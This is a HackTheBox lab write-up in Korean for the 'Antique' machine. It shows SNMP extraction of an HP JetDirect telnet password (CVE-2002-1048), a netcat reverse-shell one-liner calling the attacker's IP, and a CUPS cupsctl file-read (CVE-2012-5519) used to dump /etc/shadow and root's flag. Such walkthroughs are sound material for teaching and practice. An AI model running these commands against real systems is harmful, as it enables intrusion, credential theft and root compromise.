# Antique - HackTheBox
## Recon
```bash
sudo nmap -p 23 -sC -sV -vv -oA antique 10.10.11.107
```
<img width="1105" height="213" alt="image" src="https://github.com/user-attachments/assets/3c607d79-7108-4d5c-aaf6-71eea6f2e41e" />

- TELNET(23)

<br>

```bash
sudo nmap -p 161 -sU -sC -sV 10.10.11.107
```
<img width="1105" height="224" alt="image" src="https://github.com/user-attachments/assets/2e9ae91e-0788-47b7-9a33-96c7a914d8ed" />

- SNMP(161)

---
## telnet
### CVE-2002-1048
- `telnet`에 접속을 하게 되면 `HP JetDirect`가 출력되면서 비밀번호를 입력하라고 한다.
```bash
telnet 10.10.11.107 23
```
<img width="1105" height="245" alt="image" src="https://github.com/user-attachments/assets/5875db6b-6a98-4d90-828e-b361bc057f0f" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/CVE-2002-1048
- `SNMP`를 통해서 `JetDirect printers`의 비밀번호를 얻을 수 있는 취약점.
<img width="1216" height="143" alt="image" src="https://github.com/user-attachments/assets/d89a87f2-ab54-4afd-9bc8-c7e23d5d9158" />

<br>
<br>

- https://seclists.org/bugtraq/2003/Mar/107
- 결과가 hex로 출력되는 것을 확인.
<img width="655" height="136" alt="image" src="https://github.com/user-attachments/assets/01b99e8b-cc54-4b0e-b41b-c9d6542048a4" />

<br>
<br>

- 해당 링크에 있는 OID를 사용.
<img width="693" height="95" alt="image" src="https://github.com/user-attachments/assets/1b44d5ea-95a8-4dae-984c-5cd69599f9a7" />

<br>
<br>

- `snmpwalk`를 통해서 OID를 확인.
```bash
snmpwalk -v2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
```
<img width="1103" height="114" alt="image" src="https://github.com/user-attachments/assets/d3054041-e4d2-4fee-829d-5e8fe0824d07" />

<br>
<br>

- 출력을 한줄로 붙여줌.
<img width="1099" height="101" alt="image" src="https://github.com/user-attachments/assets/0760c699-ce92-4749-b49e-c87df3ed6165" />

<br>
<br>

- `xxd`를 통해서 text로 변환.
```bash
cat password|xxd -r -p
```
<img width="1099" height="78" alt="image" src="https://github.com/user-attachments/assets/59a4e05f-2ee1-4dbe-9c00-1681f87620ff" />

<br>
<br>

- `P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i`로 로그인 시도.
<img width="1099" height="635" alt="image" src="https://github.com/user-attachments/assets/b3d3bd0f-cb76-4b76-aaa9-208c01aaf24e" />

<br>
<br>

- `exec`를 사용하여 명령어를 실행.
<img width="1099" height="46" alt="image" src="https://github.com/user-attachments/assets/a1e20a25-b7de-4eb8-9ab2-dc09853a0fec" />

<br>
<br>

- `nc`를 사용하여 리버스 셸 명령 실행.
```
exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.4 80 >/tmp/f
```
<img width="1099" height="37" alt="image" src="https://github.com/user-attachments/assets/46a94bc1-071f-41dd-a0e1-97e1a0aad4d3" />

<br>
<br>

- 셸 획득.
<img width="1099" height="141" alt="image" src="https://github.com/user-attachments/assets/d69d69ba-f940-4177-8175-7943c327786d" />

<br>
<br>

- `telnet.py`에서 비밀번호가 `P@ssw0rd@123!!123`인 것을 확인.
<img width="1102" height="182" alt="image" src="https://github.com/user-attachments/assets/8b76a686-0f22-44fe-b36a-0e2de94037d9" />

---
## Privesc
### CVE-2012-5519
- 631포트가 오픈되어 있음.
```bash
ss -tnlp
```
<img width="1099" height="173" alt="image" src="https://github.com/user-attachments/assets/3f239e4b-e956-4467-87e8-9bb0e1ef289e" />

<br>
<br>

- `curl`로 확인해보니 `CUPS` 1.6.1버전이 실행되고 있는 것을 확인.
```bash
curl http://127.0.0.1:631
```
<img width="1099" height="179" alt="image" src="https://github.com/user-attachments/assets/09289557-4651-48d5-80cd-8eec0ea77a59" />

<br>
<br>

- https://github.com/p1ckzi/CVE-2012-5519
- 유저가 `lpadmin` 그룹에 속해 있으면 `cupsctl` 명령어를 사용하여 `root`유저의 파일을 읽을 수 있는 취약점.
<img width="1053" height="309" alt="image" src="https://github.com/user-attachments/assets/c02bde0b-ff69-4657-990e-9364a4f69eef" />

<br>
<br>

- `lpadmin`그룹에 속해 있는 것을 확인.
```bash
id
```
<img width="1103" height="42" alt="image" src="https://github.com/user-attachments/assets/642f7709-6025-4e51-9157-25b7a250870e" />

<br>
<br>

- https://github.com/p1ckzi/CVE-2012-5519/blob/main/cups-root-file-read.sh
- `WebInterface`와 `ErrorLog` 파라미터들의 값들을 설정해주고 `curl`를 통해서 파일을 읽을 수 있다고 한다.
<img width="816" height="750" alt="image" src="https://github.com/user-attachments/assets/5dc4a8d5-eed2-4098-b384-a4ab1edeb275" />

<br>
<br>

- 스크립트 순서대로 실행하여 `/etc/shadow`를 읽음.
```bash
cupsctl WebInterface=Yes

cupsctl ErrorLog='/etc/shadow'

curl http://localhost:631/admin/log/error_log
```
<img width="1102" height="99" alt="image" src="https://github.com/user-attachments/assets/bc1e4f99-6792-4ef6-a57f-a9b6edd75d03" />

---
## FLAG
- `/home/lp/user.txt`
<img width="1102" height="99" alt="image" src="https://github.com/user-attachments/assets/73130ca0-5569-47a1-8dc0-7972233ba240" />

<br>
<br>

- `/root/root.txt`
```bash
cupsctl WebInterface=Yes

cupsctl ErrorLog='/root/root.txt'

curl http://localhost:631/admin/log/error_log
```










